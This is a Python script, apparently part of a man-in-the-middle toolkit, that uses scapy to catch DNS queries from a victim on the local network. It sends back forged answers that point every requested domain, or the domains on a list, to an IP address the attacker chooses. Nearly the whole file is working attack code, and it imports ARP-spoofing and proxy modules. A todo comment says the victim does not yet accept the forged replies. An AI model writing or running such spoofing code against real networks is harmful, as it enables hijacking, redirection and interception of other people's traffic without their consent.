import scapy.all as scapy
import threading
import arp_spoofing
import proxy

#currently seems to work on unencrypted requests (eg nike.com, but not https://apple.com)

destination_ip = "142.250.179.174" #what to spoof the ip to (google.com)

IFACE = "enp0s10"

urls = [] #list of urls to spoof, empty is all

#if packet is dns and has qr=0, it is a query
def isDnsQuery(packet):
    return packet.haslayer(scapy.DNS) and packet.getlayer(scapy.DNS).qr == 0

def isDnsResponse(packet):
    return packet.haslayer(scapy.DNS) and packet.getlayer(scapy.DNS).qr == 1

def isTarget(packet): #checks whether dns url is in the list of urls to spoof
    if not urls :
        return True
    qname = packet[scapy.DNSQR].qname
    if qname in urls:
        return True
    return False

#todo client doesnt seem to take this as answer even when cut off from internet
def dns_spoof(packet):
    if not isDnsQuery(packet):
        return
    print("dns spoof, victim ip:" + str(packet[scapy.IP].src))

    qname = packet[scapy.DNSQR].qname #get the domain name client wants to resolve

    ip_src = packet[scapy.IP].src
    ip_dst = packet[scapy.IP].dst
    udp_sport = packet[scapy.UDP].sport #udp is default https://www.infoblox.com/dns-security-resource-center/dns-security-faq/is-dns-tcp-or-udp-port-53/
    udp_dport = packet[scapy.UDP].dport
    dns_id = packet[scapy.DNS].id
    dns_qd = packet[scapy.DNS].qd
        
    #dns record with the destination ip as resolved ip
    dns_rr = scapy.DNSRR(rrname=qname, rdata=destination_ip, type='A')


    spoofed_response = scapy.IP(dst=ip_src, src=ip_dst) / scapy.UDP(dport=udp_sport, sport=udp_dport)
    spoofed_response = spoofed_response / scapy.DNS(id=dns_id, qr=1, aa=1, rd=packet[scapy.DNS].rd, ra=1, qd=dns_qd, an=dns_rr, ancount=1)


    scapy.send(spoofed_response, verbose=False, iface=IFACE)